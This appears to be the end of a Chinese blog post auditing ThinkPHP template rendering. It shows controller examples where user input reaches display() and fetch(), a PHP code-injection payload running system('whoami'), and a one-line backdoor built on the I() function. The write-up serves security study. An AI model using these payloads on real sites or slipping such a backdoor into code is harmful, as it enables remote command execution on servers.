class="variable">$info</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>info=&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203202114626.png"></p>
<p>在<code>Application/Runtime/Cache/Home</code>会生成对应的模板文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203202115270.png"></p>
<ol start="2">
<li><code>$this-&gt;fetch</code></li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.info&#x27;</span>);</span><br><span class="line">        <span class="variable">$template</span>=<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$template</span>);</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.info&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);<span class="comment">#没有对&lt;和&gt;进行转义</span></span><br><span class="line">        <span class="variable">$template</span>=<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$template</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>info=&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203202120318.png"></p>
<p>在<code>Application/Runtime/Cache/Home</code>会生成对应的模板文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203202120521.png"></p>
<ol start="3">
<li>利用<code>I</code>函数留下后门</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">I</span>(<span class="string">&#x27;POST.info&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.info&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203202146980.png"></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/03/14/phpcms_V9.6.0/" rel="prev" title="phpcms_V9.6.0">
                  <i class="fa fa-chevron-left"></i> phpcms_V9.6.0
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/03/23/htb-Secret/" rel="next" title="HackTheBox-Secret">
                  HackTheBox-Secret <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Misaka</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
